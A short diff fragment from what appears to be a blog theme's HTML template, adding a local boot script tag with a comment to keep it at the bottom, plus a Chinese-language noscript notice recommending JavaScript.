+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
